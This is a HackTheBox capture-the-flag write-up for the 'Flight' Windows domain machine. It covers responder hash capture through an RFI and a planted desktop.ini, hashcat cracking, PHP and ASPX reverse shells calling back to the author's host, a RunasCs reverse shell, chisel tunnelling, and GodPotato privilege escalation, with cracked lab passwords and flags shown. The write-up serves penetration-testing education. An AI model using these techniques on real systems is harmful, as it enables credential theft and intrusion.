---
title: "Flight"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Flight

![](../assets/Pasted%20image%2020250509155128.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.187 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 15:57 CEST
Nmap scan report for 10.10.11.187
Host is up (0.041s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-09 20:57:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-05-09T20:58:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   41.78 ms 10.10.14.1
2   41.17 ms 10.10.11.187
```

Web page is like a flight planner to order tickets, but nothing works.

![](../assets/Pasted%20image%2020250509164315.png)

Brute-forcing subdomains, we discover `school`

```shell
─(kali㉿kali)-[~/htb/flight]
└─$ wfuzz -c --hh 7069 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.flight.htb" http://flight.htb   
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                  
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"                                                                                                 

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Add it to `/etc/hosts` and browse it.

![](../assets/Pasted%20image%2020250509164505.png)

Clicking the tabs shows the full URL and it's worth trying an LFI/RFI.

Start `responder` and use the RFI to get a hash.

```shell
$ curl http://school.flight.htb/index.php?view=//10.10.14.13/asdf
```

```shell
$ sudo responder -I tun0               
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:e64f85680080a84d:B9EAA150941D324B74DDA69B2F6ED433:010100000000000080077C0C24C1DB01D76FD0877A0B5DD90000000002000800590048003000580001001E00570049004E002D0043004B0034004200580059004100360047003600590004003400570049004E002D0043004B003400420058005900410036004700360059002E0059004800300058002E004C004F00430041004C000300140059004800300058002E004C004F00430041004C000500140059004800300058002E004C004F00430041004C000700080080077C0C24C1DB0106000400020000000800300030000000000000000000000000300000DF4BE5DE583DF640529B31E0D974B9E02B151C0536FCA24E2782415508869A150A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310033000000000000000000
```

We got the hash of `svc_apache` and using `hashcat`:

```shell
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force   
hashcat (v6.2.6) starting
...
SVC_APACHE::flight:e64f85680080a84d:b9eaa150941d324b74dda69b2f6ed433:010100000000000080077c0c24c1db01d76fd0877a0b5dd90000000002000800590048003000580001001e00570049004e002d0043004b0034004200580059004100360047003600590004003400570049004e002d0043004b003400420058005900410036004700360059002e0059004800300058002e004c004f00430041004c000300140059004800300058002e004c004f00430041004c000500140059004800300058002e004c004f00430041004c000700080080077c0c24c1db0106000400020000000800300030000000000000000000000000300000df4be5de583df640529b31e0d974b9e02b151c0536fca24e2782415508869a150a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000:S@Ss!K@*t13
```

	`svc_apache:S@Ss!K@*t13`

This user has access to a couple of shared folders.

![](../assets/Pasted%20image%2020250509211406.png)

The web contains the two web pages and there is nothing in the rest.

Enumerate the users and make a list.

```shell
$ rpcclient -U 'flight/svc_apache'%'S@Ss!K@*t13' //10.10.11.187 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[S.Moon] rid:[0x642]
user:[R.Cold] rid:[0x643]
user:[G.Lors] rid:[0x644]
user:[L.Kein] rid:[0x645]
user:[M.Gold] rid:[0x646]
user:[C.Bum] rid:[0x647]
user:[W.Walker] rid:[0x648]
user:[I.Francis] rid:[0x649]
user:[D.Truff] rid:[0x64a]
user:[V.Stevens] rid:[0x64b]
user:[svc_apache] rid:[0x64c]
user:[O.Possum] rid:[0x64d]
```

```shell
$ cat users | awk -F[][] '{print $2}' | sponge users
```

Testing the password, we find that `s.moon` has the same password as `svc_apache`.

![](../assets/Pasted%20image%2020250509213754.png)

`s.moon` can write into the `Shared` folder. This seems like a client-side attack.

![](../assets/Pasted%20image%2020250509225725.png)

Create a `desktopini` file with `ntlm_theft`.

```shell
$ python ntlm_theft/ntlm_theft.py -g desktopini -s 10.10.14.13 -f Services
Created: Services/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Put it in the `shared` folder and start a `responder`.

```shell
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0.4 kb/s) (average 0.7 kb/s)
smb: \> exit
```

```shell
$ sudo responder -I tun0                 
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
                                                             

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:49d3c2488f1b5079:DA4BBD6802996298134BCCF0AFB11D0C:010100000000000080526DCC2CC1DB01C5B9C27155605D9E0000000002000800500059003300430001001E00570049004E002D0048004C005A005800570051003800300035004B00580004003400570049004E002D0048004C005A005800570051003800300035004B0058002E0050005900330043002E004C004F00430041004C000300140050005900330043002E004C004F00430041004C000500140050005900330043002E004C004F00430041004C000700080080526DCC2CC1DB0106000400020000000800300030000000000000000000000000300000DF4BE5DE583DF640529B31E0D974B9E02B151C0536FCA24E2782415508869A150A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310033000000000000000000                  
[+] Exiting...

```

With `hashcat`, crack it open.

```shell
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force 
hashcat (v6.2.6) starting
...
C.BUM::flight.htb:49d3c2488f1b5079:da4bbd6802996298134bccf0afb11d0c:010100000000000080526dcc2cc1db01c5b9c27155605d9e0000000002000800500059003300430001001e00570049004e002d0048004c005a005800570051003800300035004b00580004003400570049004e002d0048004c005a005800570051003800300035004b0058002e0050005900330043002e004c004f00430041004c000300140050005900330043002e004c004f00430041004c000500140050005900330043002e004c004f00430041004c000700080080526dcc2cc1db0106000400020000000800300030000000000000000000000000300000df4be5de583df640529b31e0d974b9e02b151c0536fca24e2782415508869a150a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000:Tikkycoll_431012284
```

```shell
c.bum:Tikkycoll_431012284
```

## Initial Access

If we enumerate shares again, this is the senior dev, so he can now write to the `web` folder.

![](../assets/Pasted%20image%2020250509230013.png)

Get a PHP reverse shell and put it in the `web` folder.

```shell
smb: \school.flight.htb\images\> put shell.php
putting file shell.php as \school.flight.htb\images\shell.php (72.0 kb/s) (average 72.0 kb/s)
```

Start a listener and browse the file from the browser.

![](../assets/Pasted%20image%2020250509231245.png)

```shell
$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 50615
SOCKET: Shell has connected! PID: 2752
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\school.flight.htb\images>whoami
flight\svc_apache
```

## Privilege Escalation

Now we need to pivot to `c.bum`, so upload `RunasC` and start a listener.

```shell
C:\Users\svc_apache>.\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.13:80
```

```shell
$ rlwrap nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 52562
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
c.bum
```

Get the flag

```shell
C:\Users\C.Bum>type desktop\user.txt
type desktop\user.txt
3a89479b0fd44536ea02f85507029dc5
```

There is a `development` folder in `inetpub`. Looking at the listening ports, `8000` is open, so transfer `chisel` and let's make a port forwarding to access the web page.

```shell
C:\inetpub\development>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\inetpub\development

05/10/2025  08:22 AM    <DIR>          .
05/10/2025  08:22 AM    <DIR>          ..
04/16/2018  02:23 PM             9,371 contact.html
05/10/2025  08:22 AM    <DIR>          css
05/10/2025  08:22 AM    <DIR>          fonts
05/10/2025  08:22 AM    <DIR>          img
04/16/2018  02:23 PM            45,949 index.html
05/10/2025  08:22 AM    <DIR>          js
               2 File(s)         55,320 bytes
               6 Dir(s)   4,859,740,160 bytes free
```

```shell
$ ./chisel server --port 8003 --reverse
2025/05/10 10:03:47 server: Reverse tunnelling enabled
2025/05/10 10:03:47 server: Fingerprint 2fkdO2BmMEPUopQC3z+sj9Kqh7vHPdCsFt7m+hVGdRM=
2025/05/10 10:03:47 server: Listening on http://0.0.0.0:8003
2025/05/10 10:04:14 server: session#1: tun: proxy#R:8001=>8000: Listening


C:\Users\C.Bum>.\chisel.exe client 10.10.14.13:8003 R:8001:127.0.0.1:8000
.\chisel.exe client 10.10.14.13:8003 R:8001:127.0.0.1:8000
2025/05/10 08:05:46 client: Connecting to ws://10.10.14.13:8003
2025/05/10 08:05:46 client: Connected (Latency 43.1244ms)
```

![](../assets/Pasted%20image%2020250510103650.png)

The dev web page is like a new version, but there is not much to do.

As this project runs on IIS, let's upload an ASPX reverse shell to pivot to another user.

![](../assets/Pasted%20image%2020250510104425.png)

```shell
$ rlwrap nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 52613
Spawn Shell...
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

We have `seimpersonate` privilege with this one, so:

```shell
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Upload `godpotato` and an `msfvenom` reverse shell and:

```shell
C:\inetpub\development\development>.\GodPotato-NET4.exe -cmd "reversepe.exe"
.\GodPotato-NET4.exe -cmd "reversepe.exe"
[*] CombaseModule: 0x140711164116992
[*] DispatchTable: 0x140711166423104
[*] UseProtseqFunction: 0x140711165799632
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\790a2508-a3ed-4a86-b1f1-1e87b327a94f\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000b002-0264-ffff-b0cd-52e077895586
[*] DCOM obj OXID: 0xf7eb5dc12962d464
[*] DCOM obj OID: 0xa6f9b61c4ed4586f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 920 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3340
```

```shell
$ rlwrap nc -lnvp 2222                                                   
listening on [any] 2222 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 52727
whoami
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\development\development>whoami
nt authority\system
```

## Post Exploitation

Get the flag

```shell
C:\inetpub\development\development>type C:\users\administrator\desktop\root.txt
type C:\users\administrator\desktop\root.txt
f2440caf82a36206a471532abe18bcd6
```
